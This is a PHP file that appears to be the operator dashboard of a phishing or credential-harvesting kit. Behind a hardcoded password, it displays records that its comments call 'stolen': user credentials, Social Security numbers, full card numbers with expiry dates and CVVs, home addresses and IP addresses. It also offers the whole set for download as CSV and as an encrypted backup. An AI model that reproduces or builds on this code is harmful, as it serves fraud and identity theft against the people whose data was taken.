<?php
// Password: admin123
if($_POST['password'] !== 'admin123') die('Invalid');

echo '<h1>📊 ADMIN PANEL - ALL USER DATA</h1>';

// Show all signups
echo '<h2>User Credentials</h2>';
echo '<pre>' . file_get_contents('logs/signups.txt') . '</pre>';

// Show full stolen data
echo '<h2>Complete User Data</h2>';
$full_data = file('logs/full_data.txt');
foreach($full_data as $line) {
    $data = json_decode($line, true);
    echo '<div class="user-card">';
    echo '<strong>Email:</strong> ' . htmlspecialchars($data['email']) . '<br>';
    echo '<strong>Name:</strong> ' . htmlspecialchars($data['first_name']) . ' ' . htmlspecialchars($data['last_name']) . '<br>';
    echo '<strong>SSN:</strong> ' . htmlspecialchars($data['ssn']) . '<br>';
    echo '<strong>Card:</strong> ' . htmlspecialchars($data['card_number']) . '<br>';
    echo '<strong>Exp:</strong> ' . htmlspecialchars($data['card_exp']) . '<br>';
    echo '<strong>CVV:</strong> ' . htmlspecialchars($data['card_cvv']) . '<br>';
    echo '<strong>Address:</strong> ' . htmlspecialchars($data['street']) . ', ' . htmlspecialchars($data['city']) . ', ' . htmlspecialchars($data['state']) . ' ' . htmlspecialchars($data['zip']) . '<br>';
    echo '<strong>IP:</strong> ' . htmlspecialchars($data['ip']) . '<br>';
    echo '<strong>Time:</strong> ' . htmlspecialchars($data['timestamp']) . '<br>';
    echo '</div><hr>';
}

// Export buttons
echo '<a href="logs/data.csv" download>📥 Download CSV</a><br>';
echo '<a href="logs/encrypted_data.txt" download>🔒 Download Encrypted Backup</a>';
?>
